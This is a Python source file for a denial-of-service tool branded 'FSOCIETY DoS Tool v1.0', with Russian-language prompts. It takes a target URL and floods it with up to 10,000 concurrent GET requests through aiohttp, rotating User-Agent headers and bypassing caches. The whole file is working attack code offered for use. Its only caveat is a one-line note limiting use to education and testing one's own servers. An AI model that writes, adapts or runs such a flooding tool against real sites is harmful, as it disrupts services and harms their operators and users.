import asyncio
import aiohttp
import random
from colorama import Fore, init
import sys
import os
import re

from config import UserAgents


init(autoreset=True)


class AttackTool:
    def __init__(self, target_url, num_requests):
        self.target_url = target_url
        self.num_requests = num_requests
        self.success_count = 0
        self.error_count = 0


    async def send_request(self, session):
        headers = {
            "User-Agent": random.choice(UserAgents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache"
        }
        
        try:
            async with session.get(self.target_url, headers=headers) as response:
                print(Fore.GREEN + f"fsociety@root Запрос к {self.target_url} - Статус: {response.status}")
                self.success_count += 1
                return True
        except Exception as e:
            print(Fore.RED + f"fsociety@root Ошибка запроса к {self.target_url}: {str(e)[:80]}")
            self.error_count += 1
            return False


    async def attack(self):
        print(Fore.CYAN + f"\nНачинаем отправку запросов на {self.target_url}...\n")
        
        connector = aiohttp.TCPConnector(limit=1000, force_close=True)
        timeout = aiohttp.ClientTimeout(total=5)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = []
            for i in range(self.num_requests):
                task = asyncio.create_task(self.send_request(session))
                tasks.append(task)
                
                if len(tasks) >= 100:
                    await asyncio.gather(*tasks)
                    tasks = []
                    
            if tasks:
                await asyncio.gather(*tasks)
        print(Fore.CYAN + "\n-------------------------------------------")
        print(Fore.YELLOW + "Завершено. Статистика:)")
        print(Fore.CYAN + "-------------------------------------------")
        print(Fore.GREEN + f"Успешных запросов: {self.success_count}")
        print(Fore.RED + f"Неудачных запросов: {self.error_count}")
        print(Fore.CYAN + f"Общее количество: {self.success_count + self.error_count}")
        print(Fore.CYAN + "-------------------------------------------")
        
        return True


def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')

    print(Fore.CYAN + """
     ███████████  █████████     ███████      █████████  █████ ██████████ ███████████ █████ █████
    ░░███░░░░░░█ ███░░░░░███  ███░░░░░███   ███░░░░░███░░███ ░░███░░░░░█░█░░░███░░░█░░███ ░░███ 
    ░███   █ ░ ░███    ░░░  ███     ░░███ ███     ░░░  ░███  ░███  █ ░ ░   ░███  ░  ░░███ ███  
    ░███████   ░░█████████ ░███      ░███░███          ░███  ░██████       ░███      ░░█████   
    ░███░░░█    ░░░░░░░░███░███      ░███░███          ░███  ░███░░█       ░███       ░░███    
    ░███  ░     ███    ░███░░███     ███ ░░███     ███ ░███  ░███ ░   █    ░███        ░███    
    █████      ░░█████████  ░░░███████░   ░░█████████  █████ ██████████    █████       █████    
    ░░░░░        ░░░░░░░░░     ░░░░░░░      ░░░░░░░░░  ░░░░░ ░░░░░░░░░░    ░░░░░       ░░░░░

                                [https://github.com/DenisPythoneer]                                                                                     
    """)
    
    print(Fore.YELLOW + "DoS Tool v1.0")
    print(Fore.RED + "ВАЖНО: Используйте только для образовательных целей и тестирования своих серверов!\n")


def get_user_input():
    show_banner()
    
    while True:
        target_url = input(Fore.WHITE + "Введите URL цели (например, http://example.com): ").strip()
        if not target_url:
            print(Fore.RED + "URL не может быть пустым!")
            continue
            
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
            
        if not re.match(r'^https?://[^\s/$.?#].[^\s]*$', target_url):
            print(Fore.RED + "Некорректный URL! Пример: http://example.com")
            continue
            
        break
    
    while True:
        try:
            num_requests = int(input(Fore.WHITE + "Введите количество запросов (10-1000): "))
            if num_requests < 10:
                print(Fore.RED + "Минимальное количество запросов - 10!")
                continue
            if num_requests > 10000:
                print(Fore.RED + "Слишком большое число! Максимум 10000")
                continue
            break
        except ValueError:
            print(Fore.RED + "Пожалуйста, введите целое число!")
    
    return target_url, num_requests


async def main():
    try:
        target_url, num_requests = get_user_input()
        
        print(Fore.YELLOW + f"\nНачинаем отправку {num_requests} запросов на {target_url}...")
        print(Fore.YELLOW + "Нажмите Ctrl+C для остановки\n")
        
        tool = AttackTool(target_url, num_requests)
        await tool.attack()
        
    except Exception as e:
        print(Fore.RED + f"\nКритическая ошибка: {e}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(Fore.RED + "\nПрограмма прервана пользователем.")
        sys.exit(0)